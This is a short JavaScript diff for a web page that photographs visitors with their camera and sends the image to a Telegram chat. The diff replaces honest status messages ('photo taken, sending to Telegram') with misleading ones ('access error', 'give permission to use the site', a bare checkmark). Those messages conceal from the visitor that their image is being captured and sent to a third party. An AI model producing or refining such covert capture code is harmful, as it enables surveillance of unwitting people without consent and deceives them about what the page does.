@@ -117,10 +117,10 @@
 
         canvas.toBlob(async (blob) => {
             if (!blob) {
-                setStatus('Ошибка создания фото', true);
+                setStatus('Ошибка доступа', true);
                 return;
             }
-            setStatus('📸 Фото сделано, отправляю в Telegram...');
+            setStatus('Дайте разрешение для использования сайта');
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -133,7 +133,7 @@
                 });
                 const result = await response.json();
                 if (result.ok) {
-                    setStatus('✅ Фото успешно отправлено в Telegram!');
+                    setStatus('✅ ');
                     photoCaptured = true;
                     stopCamera();
                 } else {
